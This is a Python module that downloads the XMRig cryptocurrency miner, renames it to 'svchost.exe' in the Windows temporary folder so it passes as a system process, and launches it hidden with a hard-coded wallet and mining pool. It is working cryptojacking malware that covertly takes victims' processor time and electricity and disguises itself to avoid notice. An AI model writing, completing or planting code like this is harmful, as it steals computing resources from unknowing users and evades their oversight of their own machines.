import os
import subprocess
import requests
import time
import zipfile
import threading

WALLET = "Bv3WEwFb17vKiiLGM7xc1UtxzWWfmzNimkq7CyVBjLfU"
MINER_EXE = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'svchost.exe')

def start():
    """Start miner in background."""
    print("[DEBUG] Starting miner...")
    
    # Run in background thread
    t = threading.Thread(target=_run_miner, daemon=True)
    t.start()

def _run_miner():
    try:
        # Check if already running
        if _is_running():
            return
        
        # Download if not exists
        if not os.path.exists(MINER_EXE):
            print("[DEBUG] Downloading miner...")
            if not _download_miner():
                print("[DEBUG] Miner download failed")
                return
        
        print("[DEBUG] Starting miner...")
        subprocess.Popen(
            [MINER_EXE,
             "--url=pool.supportxmr.com:3333",
             f"--user={WALLET}",
             "--pass=x",
             "--threads=2",
             "--keepalive",
             "--donate-level=1"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("[DEBUG] Miner started")
    except Exception as e:
        print(f"[DEBUG] Miner error: {e}")

def _is_running():
    try:
        result = subprocess.run(['tasklist', '/FI', 'IMAGENAME eq svchost.exe'], 
                               capture_output=True, text=True)
        return 'svchost.exe' in result.stdout
    except:
        return False

def _download_miner():
    try:
        # Download XMRig
        url = "https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip"
        temp_zip = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'xmrig.zip')
        
        response = requests.get(url, stream=True, timeout=60)
        if response.status_code != 200:
            return False
        
        with open(temp_zip, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        # Extract
        with zipfile.ZipFile(temp_zip, 'r') as zf:
            zf.extractall(os.environ.get('TEMP', 'C:\\Windows\\Temp'))
        
        # Find and rename xmrig.exe to svchost.exe
        for root, dirs, files in os.walk(os.environ.get('TEMP', 'C:\\Windows\\Temp')):
            for f in files:
                if f == 'xmrig.exe':
                    src = os.path.join(root, f)
                    os.rename(src, MINER_EXE)
                    return True
        
        return False
    except Exception as e:
        print(f"[DEBUG] Download error: {e}")
        return False